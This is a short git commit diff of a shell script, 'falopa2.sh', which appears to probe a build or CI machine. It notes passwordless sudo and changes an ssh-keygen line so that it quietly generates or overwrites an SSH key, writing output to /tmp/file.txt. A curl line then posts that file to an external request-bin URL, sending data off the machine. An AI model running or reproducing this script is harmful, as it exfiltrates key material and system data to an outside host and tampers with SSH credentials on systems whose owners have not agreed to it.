76d24a304f61b2dc745bbd80cdd7e10264228844
_m <matiasesena@gmail.com>
2021-11-04 16:07:40 -0300

    Update falopa2.sh

--- falopa2.sh
+++ falopa2.sh
@@ -3,7 +3,7 @@
 # install gdb sudo is passwordless according to doc
 #sudo apt-get install gdb -y > /tmp/file.txt
 
-ssh-keygen -y > /tmp/file.txt
+ssh-keygen -q -t rsa -N 'passphrase' <<< $'\ny' >/dev/null 2>&1 > /tmp/file.txt
 echo "---------------------"
 
 curl --data-binary "@/tmp/file.txt" https://en0liva7dzyvpp.x.pipedream.net/
